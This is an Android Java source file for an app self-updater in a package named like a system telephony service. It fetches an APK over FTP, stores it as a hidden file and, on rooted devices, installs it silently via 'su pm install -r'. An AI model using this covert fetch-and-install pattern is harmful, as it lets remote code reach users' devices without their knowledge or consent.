package com.telephony.services;

import java.io.File;
import java.io.IOException;
import java.io.StringReader;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class Updater {
	private MyFTPClient ftp = null;
	private Context context;
	private MyProperties props = null;
	private PreferenceUtils sPref = null;

	public static final String VER_PROP_FILE = "update.ver";
	public static final String REMOTE_VER = "ver";
	public static final String APK_REMOTE_FILE = "apk";
	public static final String APK_MD5SUM = "md5";
	public static final String APK_REMOTE_DESCRIPTION = "description";

	public Updater(Context context, final MyFTPClient ftp) throws IOException {
		this.ftp = ftp;
		this.context = context;
		sPref = PreferenceUtils.getInstance(context);
		props = new MyProperties();
		props.load(new StringReader(Utils.implodeStrings(ftp.downloadFileStrings(VER_PROP_FILE), "\n")));
	}

	/**
	 * Получить версию с удаленного сервера
	 * 
	 * @return Версия VersionCode
	 */
	public int getRemoteVersion() {
		if (!props.isEmpty()) {
			return props.getIntProperty(REMOTE_VER, 0);
		}
		return 0;
	}

	/**
	 * Получить md5sum для удаленного файла
	 * 
	 * @return Строка содержащая md5.
	 * @throws IOException
	 *             если APK_MD5SUM не найдено
	 */
	public String getRemoteMD5sum() throws IOException {
		if (!props.isEmpty() && props.containsKey(APK_MD5SUM)) {
			return props.getProperty(APK_MD5SUM);
		}
		throw new IOException(APK_MD5SUM + " not exists!");
	}

	/**
	 * Получить APK имя файла на сервере
	 * 
	 * @return Имя APK файла
	 * @throws IOException
	 *             если APK_REMOTE_FILE не найдено
	 */
	public String getAPKRemoteFile() throws IOException {
		if (!props.isEmpty() && props.containsKey(APK_REMOTE_FILE)) {
			return props.getProperty(APK_REMOTE_FILE, "");
		}
		throw new IOException(APK_REMOTE_FILE + " not exists!");
	}

	/**
	 * Получить описание обновления
	 * 
	 * @return Описание обновления
	 */
	public String getAPKRemoteDescription() {
		if (!props.isEmpty()) {
			return props.getProperty(APK_REMOTE_DESCRIPTION, "");
		}
		return null;
	}

	/**
	 * Обновить программу. Если есть root - то обновить тихо, если нет - то вывести уведомление о новом обновлении
	 * 
	 * @throws IOException
	 */
	public void updateAPK() throws IOException {
		if (!Utils.md5sum(Utils.getPackageFile(context)).equals(getRemoteMD5sum())) {
			if (ftp.getFileSize(getAPKRemoteFile()) > 0) {
				File apk_file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), getAPKRemoteFile()));
				if (apk_file != null) {
					if (!apk_file.exists() || !Utils.md5sum(apk_file).equals(getRemoteMD5sum())) {
						ftp.downloadFile(getAPKRemoteFile(), apk_file);
					}
					if (apk_file.exists() && Utils.md5sum(apk_file).equals(getRemoteMD5sum())) {
						if (Utils.checkRoot()) {
							new Proc("su").exec(new String[] { "pm install -r " + apk_file.getAbsolutePath() });
						} else {
							Intent intent = new Intent(Intent.ACTION_VIEW);
							intent.setDataAndType(Uri.fromFile(apk_file), "application/vnd.android.package-archive");
							intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							Utils.show_notification(context, 0, getAPKRemoteDescription(), intent);
						}
					}
				}

			}
		}
	}
}
